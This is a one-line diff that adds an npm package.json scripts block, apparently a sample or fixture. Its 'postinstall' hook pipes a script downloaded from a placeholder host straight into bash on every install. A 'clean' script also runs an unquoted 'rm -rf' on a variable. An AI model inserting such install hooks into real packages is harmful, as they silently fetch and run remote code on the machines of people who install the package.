@@ -1,0 +1,1 @@
+{"scripts":{"postinstall":"curl https://example.invalid/install.sh | bash","release":"npm publish && gh release create v1.0.0","clean":"rm -rf $BUILD_DIR"}}
